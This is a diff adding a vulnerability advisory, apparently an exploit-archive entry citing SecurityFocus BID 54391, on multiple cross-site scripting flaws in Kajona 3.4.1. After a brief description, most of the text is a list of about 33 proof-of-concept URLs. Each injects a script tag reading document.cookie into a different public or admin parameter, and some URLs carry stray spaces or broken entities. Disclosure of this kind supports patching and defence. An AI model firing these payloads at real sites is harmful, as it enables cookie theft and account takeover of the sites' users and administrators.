@@ -1,0 +1,45 @@
+source: http://www.securityfocus.com/bid/54391/info
+
+Kajona is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.
+
+Kajona 3.4.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com/index.php?page=contact&absender_name=%22%3E%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E
+http://www.example.com/index.php?page=contact&absender_email=%22%3E%3Cscript%3Ealert%28doc ument.cookie%29;%3C/script%3E
+http://www.example.com/index.php?page=contact&absender_nachricht=%3C/texta rea%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?page=postacomment&comment_name=%22%3E%3Cscript%3Ealert%28document.cookie %29;%3C/script%3E
+http://www.example.com/index.php?page=postacomment&comment_subject=%22%3E%3Cscript%3Ea lert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?page=postacomment&comment_messa ge=%3C/textarea%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?module=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?module=login&admin=1&action=%3Cscript%3Ealert%28document.cookie%29;% 3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&action=list&pv=%22%3E%3Cscript%3Ealert%28doc ument.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&action=list&p e=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&action=newUser&user_username=%22%3E%3Cscript %3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&act ion=newUser&user_email=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com /index.php?admin=1&module=user&action=newUser&user_forename=%22%3E%3Cscript%3Ealert%28do cument.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&action=newUser&a mp;user_name=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?adm in=1&module=user&action=newUser&user_street=%22%3E%3Cscript%3Ealert%28document.cookie%29 ;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&action=newUser&user_postal=% 22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&modul e=user&action=newUser&user_city=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&action=newUser&user_tel=%22%3E%3Cscript%3Eal ert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&action=n ewUser&user_mobile=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&action=groupNew&group_name=%22%3E%3Cscript%3 Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=user&actio n=groupNew&group_desc=%3C/textarea%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=pages&action=newPage&name=%22%3E%3Cscript%3Ealert %28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=pages&action=new Page&browsername=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index .php?admin=1&module=pages&action=newPage&seostring=%22%3E%3Cscript%3Ealert%28document.co okie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=pages&action=newPage&keywo rds=%3C/textarea%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?adm in=1&module=pages&action=newPage&folder_id=%22%3E%3Cscript%3Ealert%28document.cookie%29; %3C/script%3E
+http://www.example.com/index.php?admin=1&module=pages&action=newElement&element_name=%22%3E%3Cscr ipt%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=pages& ;action=newElement&element_cachetime=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=system&action=newAspect&aspect_name=%22%3E%3Cscri pt%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=filemanager&action=newRepo&filemanager_name=%22%3 E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=fi lemanager&action=newRepo&filemanager_path=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/s cript%3E
+http://www.example.com/index.php?admin=1&module=filemanager&action=newRepo&filemanager_ upload_filter=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?ad min=1&module=filemanager&action=newRepo&filemanager_view_filter=%22%3E%3Cscript%3Ealert% 28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=downloads&action=newArchive&archive_title=%22%3E% 3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+http://www.example.com/index.php?admin=1&module=down loads&action=newArchive&archive_path=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script %3E
+
+
